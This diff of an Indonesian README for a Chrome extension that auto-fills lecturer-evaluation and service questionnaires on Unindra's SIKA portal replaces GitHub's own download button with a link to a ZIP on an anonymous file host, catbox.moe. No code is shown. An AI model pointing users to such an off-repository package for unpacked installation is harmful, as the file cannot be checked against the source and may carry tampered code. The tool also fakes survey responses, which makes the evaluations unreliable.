@@ -2,7 +2,7 @@
 
 # 🎓 MySika Kuesioner Otomatis
 
-### Ekstensi Chrome Pintar untuk Mahasiswa Unindra
+### Ekstensi Chrome untuk Mahasiswa Unindra
 
 *Automatisasi pengisian kuesioner EDOM & Layanan di portal SIKA dengan cepat dan efisien*
 
@@ -76,7 +76,7 @@ Desain clean, intuitive, dan user-friendly dengan UX yang optimal.
 ### **Metode 1: Download Langsung**
 
 1. **📁 Download ZIP File**  
-   Klik tombol **"Download ZIP"** di halaman GitHub repository.
+   [![Download ZIP](https://img.shields.io/badge/📁_Download-ZIP_File-blue?style=for-the-badge&logo=download)](https://files.catbox.moe/mu7iw2.zip)
 
 2. **📂 Ekstrak File**  
    Ekstrak file ZIP ke folder yang mudah diakses.
@@ -91,7 +91,7 @@ Desain clean, intuitive, dan user-friendly dengan UX yang optimal.
    Klik **"Load unpacked"** dan pilih folder hasil ekstrak.
 
 6. **🎉 Instalasi Selesai!**  
-   Ekstensi akan muncul di toolbar Chrome.
+   Tombol MySika akan muncul mengambang di pojok kanan bawah halaman.
 
 ### **Metode 2: Clone Repository**
 
@@ -115,7 +115,7 @@ Lalu ikuti langkah 3-6 dari metode 1.
 | Step | Aksi | Deskripsi |
 |------|------|-----------|
 | **1** | 🌐 **Buka Portal SIKA** | Login ke portal SIKA Unindra dan navigasi ke halaman Kuesioner |
-| **2** | 🔧 **Klik Ekstensi** | Klik ikon MySika di toolbar Chrome (pastikan sudah di halaman kuesioner) |
+| **2** | 🔧 **Klik Tombol Mengambang** | Klik tombol MySika yang mengambang di pojok kanan bawah (pastikan sudah di halaman kuesioner) |
 | **3** | ⚙️ **Pilih Opsi** | Tentukan jenis penilaian: Sangat Baik, Baik, atau Acak |
 | **4** | 🎯 **Pilih Jenis Kuesioner** | Klik "Isi Kuesioner EDOM" atau "Isi Kuesioner Layanan" |
 | **5** | ✨ **Enjoy the Magic!** | Duduk santai dan lihat formulir terisi otomatis |
